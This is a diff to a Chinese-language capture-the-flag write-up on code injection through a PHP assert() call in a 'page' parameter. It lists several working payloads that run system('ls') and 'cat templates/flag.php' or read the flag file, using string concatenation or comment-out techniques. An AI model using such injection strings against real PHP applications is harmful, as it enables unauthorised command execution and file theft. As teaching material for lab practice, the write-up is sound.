@@ -33,17 +33,63 @@ assert("file_exists('$file')") or die("That file doesn't exist!");
 
 观察可以发现，page传入的参数存在代码注入漏洞，顺便提一下assert()函数会把传入的字符串当做php代码来执行。
 
-### 注入思路：整体上可以注释掉', '..') === false，或者不注释，只在中间插入。另外要注意闭合单引号和括号。
+## 注入思路：整体上可以注释掉', '..') === false，或者不注释，只在中间插入。另外要注意闭合单引号和括号。
 
 
-中间插入型，使用 . 连接符：
+#### 中间插入型，使用 . 连接符：
 
 查看目录：?page=flag'.system("ls").'
 
 ![description](images/1.png)
 
+进入目录并查看文件：?page=flag'.system("cd templates;ls").'
 
+![description](images/2.png)
 
+查看flag.php：?page=flag'.system("cat templates/flag.php").'
+
+![description](images/3.png)
+
+浏览器F12进入网页源码看到flag。
+
+![description](images/4.png)
+
+拿到flag。
+
+说一下 . 连接符，?page=flag'.system("ls").'带入后得到
+assert("strpos('flag'.system("ls").'.php', '..') === false") or die("Detected hacking attempt!");  执行过程为 ：字符串'flag'和system("ls")和字符串'.php'拼接后，作为strpos()的第一个参数。重点是system()函数是会直接把结果输出的，不用echo，也可以输出，所以system("ls")就直接把目录输出了。
+
+下面是几种方式：
+
+(1) ?page=flag'.system("cat templates/flag.php").'
+~~~~
+assert("strpos('templates/flag'.system("cat templates/flag.php").'.php', '..') === false") or die("Detected hacking attempt!");
+~~~~
+(2) 
+~~~~
+?page=', '..') === false and $myfile = fopen("templates/flag.php", "r") and exit(fread($myfile,filesize("templates/flag.php"))) or true or strpos('
+~~~~
+~~~~
+assert("strpos('templates/', '..') === false and $myfile = fopen("templates/flag.php", "r") and exit(fread($myfile,filesize("templates/flag.php"))) or true or strpos('.php', '..') === false") or die("Detected hacking attempt!");
+~~~~
+
+#### 注释型
+
+注意：assert()函数会把传入的字符串当做php代码来执行。
+
+如果注释掉后面的语句：
+
+(1) ?page=','88')===false and system("cat templates/flag.php");//
+~~~~
+assert("strpos('templates/','88')===false and system("cat templates/flag.php");//.php', '..') === false") or die("Detected hacking attempt!");
+~~~~
+
+(2) flag','..')+or+system('cat+templates/flag.php');//
+
+或者写成 flag','..') or system('cat templates/flag.php');//
+~~~~
+assert("strpos('templates/flag','..') or system('cat templates/flag.php');//.php', '..') === false") or die("Detected hacking attempt!");
+~~~~
 
 
 
